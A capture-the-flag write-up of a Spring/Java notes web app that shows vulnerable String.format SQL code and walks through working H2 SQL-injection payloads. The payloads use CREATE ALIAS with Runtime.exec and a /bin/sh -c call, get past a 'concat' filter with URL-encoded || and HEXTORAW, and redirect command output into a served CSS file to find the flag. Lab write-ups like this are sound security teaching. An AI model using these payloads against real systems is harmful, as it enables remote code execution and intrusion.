:PROPERTIES:
:ID:       dae866e3-b237-4044-ab1f-df4b993193be
:END:
#+TITLE: Pentest Notes
#+AUTHOR: AsmArtisan256
#+DATE: 09-01-2025

#+OPTIONS: html-style:nil
#+OPTIONS: html-scripts:nil

#+OPTIONS: author:nil
#+OPTIONS: email:nil
#+OPTIONS: date:t
#+OPTIONS: toc:nil

#+PROPERTY: header-args :eval no

#+HTML_HEAD: <link rel="stylesheet" type="text/css" href="/style.css"/>

#+EXPORT_FILE_NAME: pentestnotes

I can start this by saying that this challenge was exceptionally good. Many
phases, the payload crafting was great, but very frustrating, I admit.

This is a web app that presents a login page, but it's also possible to register
a user.


#+DOWNLOADED: screenshot @ 2025-01-09 13:48:57
#+attr_org: :width 600px
[[file:writeup-img/2025-01-09_13-48-57_screenshot.png]]


Since I have no clue if any users exist, I just create one. After logging in
with the newly created user, I was presented with a list of 3 notes.


#+DOWNLOADED: screenshot @ 2025-01-09 13:51:00
#+attr_org: :width 600px
[[file:writeup-img/2025-01-09_13-51-00_screenshot.png]]

The notes are really not relevant at all. It's possible to click on them and go
to a page where the same text is presented. One curious thing about that is the
URL: =http://127.0.0.1:8080/note?name=Skill issue=. It contains a parameter, which
made me think of SQL injection right away. But firstly, it's always best to
download the web application files and read the code.

It looks like it's using the Spring Framework, using Java code. So I skipped
directly to the controller related to the notes, =NotesController.java=, where
it's easy to understand that a SQL injection vulnerability is available for
exploitation because the query is being built using =String.format=, where no
parameters are sanitized at all.

#+BEGIN_SRC java
@PostMapping("/note")
public ResponseEntity < ? > noteByName(@RequestParam String name, HttpSession httpSession) {
    if (httpSession.getAttribute("username") == null) {
        return ResponseEntity.status(HttpStatus.UNAUTHORIZED).body("unauthorized");
    }
    if (name.contains("$") || name.toLowerCase().contains("concat")) {
        return ResponseEntity.status(HttpStatus.FORBIDDEN).body("Bad character in name :)");
    }
    String query = String.format("Select * from notes where name ='%s' ", name);
    List < Object[] > resultList = entityManager.createNativeQuery(query).getResultList();
    List < Map < String, Object >> result = new ArrayList < > ();
    for (Object[] row: resultList) {
        Map < String, Object > rowMap = new HashMap < > ();
        rowMap.put("ID", row[0]);
        rowMap.put("Name", row[1]);
        rowMap.put("Note", row[2]);
        result.add(rowMap);
    }
    return ResponseEntity.ok(result);
}
#+END_SRC

The easiest way, in my opinion, to test if we are able to do some kind of SQL
injection, is to just use the =AND= SQL operator and duplicate the condition,
which actually worked and returned me the correct note.

#+BEGIN_SRC
// URL
http://127.0.0.1:8080/note?name=Skill issue' and name='Skill issue

// Query
Select * from notes where name = 'Skill issue' and name = 'Skill issue'
#+END_SRC

Now, since we need to craft some crazy query, I advise to use the =Dockerfile= to
create the container and to test locally, because it's also possible to check
the error messages in the logs.

Since I didn't know the type of the database, I had to search the web
application files, only to find out this using 'H2', an open-source database in
Java. The first step was to check any kind of RCE exploits or payloads. And that
is how I found a [[https://www.sonarsource.com/blog/dotcms515-sqli-to-rce/][website]] with an RCE payload that looks pretty good! Creates an
=ALIAS= to a =Java= function that executes a shell command. That's what is needed!

#+BEGIN_SRC sql
CREATE ALIAS EXEC AS CONCAT('void e(String cmd) throws java.io.IOException', HEXTORAW('007b'),'java.lang.Runtime rt = java.lang.Runtime.getRuntime(); rt.exec(cmd);',HEXTORAW('007d'));
CALL EXEC('whoami');
#+END_SRC

So now, before building the payload, it's important to note that the
=String.format= inserts the string between single quotes ='%s'= and could mess up
the payload. So, an important thing is to just end the =name= parameter with a
single quote and a semicolon, to start another set of commands, and then end
with =--= to ignore everything after. In this case, the URL will be:

#+BEGIN_SRC
http://127.0.0.1:8080/note?name=Skill issue'; CREATE ALIAS EXEC AS CONCAT('void e(String cmd) throws java.io.IOException',HEXTORAW('007b'),'java.lang.Runtime rt= java.lang.Runtime.getRuntime();rt.exec(cmd);',HEXTORAW('007d'));CALL EXEC('whoami'); --
#+END_SRC

Except... the payload didn't work, at all. But we got a response from the
server: =Bad character in name :)=. If we look at the code of the method above,
that string is in there and it is only returned if the parameter contains dollar
signs or the string =concat=. And in fact, the query I did contains the =concat=
keyword. This function is used to concatenate the strings that are passed as
parameters, but there is another way of doing that without using =concat=, and
that is by using the =||= operator. And this is something that must be used,
because we can't use =[]= or ={}= in the URL string, so HEXTORAW is used to bypass
that issue and it has to be concatenated to the rest of the strings. The =||=
should also be URL encoded.

So here is the new payload:

#+BEGIN_SRC
CREATE ALIAS EXEC2 AS 'void e(String cmd) throws java.io.IOException ' %7c%7c HEXTORAW('007b') %7c%7c 'java.lang.Runtime rt = java.lang.Runtime.getRuntime(); rt.exec(cmd);' %7c%7c HEXTORAW('007d'); CALL EXEC('whoami'); --
#+END_SRC

It's possible to tell it worked because the page loaded as expected by showing
the correct note. But nothing else happened. And that makes sense.The output of
the command is going to nowhere. It's not being printed, it's not being
redirected, nothing. Ideally, we must change the code so we can actually execute
shell commands that include redirection. Instead of passing a simple =String= to
the =exec= method, we must pass a variable of the type =String[]=, which should be
declared as follows:

#+BEGIN_SRC java
String[] cmd2 = {"/bin/sh", "-c", cmd};
rt.exec(cmd2);
#+END_SRC

Let's not forget that now, =[]= should be go through =HEXTORAW=, just like the
double quotes. And I did that to the double quotes just to make sure!

#+BEGIN_SRC
CREATE ALIAS EXEC3 AS 'void e(String cmd) throws java.io.IOException ' %7c%7c HEXTORAW('007b') %7c%7c 'java.lang.Runtime rt = java.lang.Runtime.getRuntime(); String' %7c%7c HEXTORAW('005b') %7c%7c HEXTORAW('005d') %7c%7c ' cmd2 = ' %7c%7c HEXTORAW('007b') %7c%7c HEXTORAW('0022') %7c%7c '/bin/sh' %7c%7c HEXTORAW('0022') %7c%7c ',' %7c%7c HEXTORAW('0022') %7c%7c '-c' %7c%7c HEXTORAW('0022') %7c%7c ', cmd' %7c%7c HEXTORAW('007d') %7c%7c '; rt.exec(cmd2);' %7c%7c HEXTORAW('007d');--
#+END_SRC

Now that is one gigantic payload. But after the request, everything worked! So
now =EXEC2= can be used to execute shell commands. Let's see what does the root
directory has. And let's redirect its output to
=target/classes/static/Css/main.css= which is the main file that is being served
by the HTTP server.

#+BEGIN_SRC
http://127.0.0.1:8080/note?name=Skill issue'; CALL EXEC3('ls -la / > target/classes/static/Css/main.css');--
#+END_SRC

By checking the =main.css= file now, it contains the output of the command:

#+BEGIN_SRC
http://127.0.0.1:8080/Css/main.css

total 100
drwxr-xr-x   1 root root 4096 Jan  9 13:28 .
drwxr-xr-x   1 root root 4096 Jan  9 13:28 ..
-rwxr-xr-x   1 root root    0 Jan  9 13:28 .dockerenv
-rw-rw-rw-   1 root root   26 Oct  5 12:16 UttCBDpF0EF5_flag.txt
drwxr-xr-x   1 root root 4096 Jan  9 13:28 app
drwxr-xr-x   2 root root 4096 Apr 18  2022 bin
drwxr-xr-x   2 root root 4096 Mar 19  2022 boot
drwxr-xr-x   5 root root  340 Jan  9 13:28 dev
drwxr-xr-x   1 root root 4096 Jan  9 13:28 etc
drwxr-xr-x   2 root root 4096 Mar 19  2022 home
drwxr-xr-x   1 root root 4096 Apr 18  2022 lib
drwxr-xr-x   2 root root 4096 Apr 18  2022 lib64
drwxr-xr-x   2 root root 4096 Apr 18  2022 media
drwxr-xr-x   2 root root 4096 Apr 18  2022 mnt
drwxr-xr-x   2 root root 4096 Apr 18  2022 opt
dr-xr-xr-x 602 root root    0 Jan  9 13:28 proc
drwx------   1 root root 4096 Jan  9 13:28 root
drwxr-xr-x   3 root root 4096 Apr 18  2022 run
drwxr-xr-x   2 root root 4096 Apr 18  2022 sbin
drwxr-xr-x   2 root root 4096 Apr 18  2022 srv
dr-xr-xr-x  13 root root    0 Jan  9 13:28 sys
drwxrwxrwt   1 root root 4096 Jan  9 13:28 tmp
drwxr-xr-x   1 root root 4096 Apr 18  2022 usr
drwxr-xr-x   1 root root 4096 Apr 18  2022 var
#+END_SRC

The flag is right there! Now it's just a matter of printing the flag to the same
file and there we go!


* FOOTER                                                                                              :ignore:
:PROPERTIES:
:clearpage: t
:END:
#+BEGIN_EXPORT html
<hr>
<footer>
  <div class="container">
    <ul class="menu-list">
      <li class="menu-list-item flex-basis-100-margin fit-content">
        <a href="/index.html">Home</a>
      </li>
      <li class="menu-list-item flex-basis-100-margin fit-content">
        <a href="/articles/articles.html">Articles</a>
      </li>
      <li class="menu-list-item flex-basis-100-margin fit-content">
        <a href="/writeups/writeups.html">Write-Ups</a>
      </li>
      <li class="menu-list-item flex-basis-100-margin fit-content">
        <a class="inactive-link">09-01-2025</a>
      </li>
    </ul>
  </div>
</footer>
#+END_EXPORT
